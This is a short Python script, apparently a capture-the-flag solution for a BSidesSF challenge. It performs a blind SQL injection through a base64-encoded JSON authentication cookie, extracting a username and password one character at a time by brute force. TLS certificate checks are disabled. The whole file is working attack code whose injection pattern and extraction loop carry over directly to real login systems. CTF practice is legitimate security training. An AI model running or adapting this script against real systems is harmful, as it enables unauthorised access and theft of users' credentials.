#### exploit by p4w ####
import base64 as b64
import requests
import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = "https://sequel-9cba4c8e.challenges.bsidessf.net/sequels"
user = ''
for i in range(1,12):
    for c in range(0x30,129):
        p = b64.b64encode("""{"username":"asd\\" or substr(username,"""+ str(i) +""",1)='"""+chr(c)+"""' and username !='guest' -- ", "password":"whocares"}""")
        cookie = {"1337_AUTH": p}
        r = requests.get(url,cookies=cookie,verify=False)
        if r.text.find("Invalid user/pass.") >=0 :
            user+=chr(c)
            print "[+] username: " + user
            break



pwd = ''
for i in range(1,33):
    for c in range(0x30,129):
        p = b64.b64encode("""{"username":"asd\\" or username='"""+user+"""' and substr(password,"""+ str(i) +""",1)='"""+ chr(c) +"""' -- ", "password":"whocares"}""")
        cookie = {"1337_AUTH": p}
        r = requests.get(url,cookies=cookie,verify=False)
        if r.text.find("Invalid user/pass.") >=0 :
            pwd+=chr(c)
            print "[+] password: " + pwd
            break

print user +":"+pwd
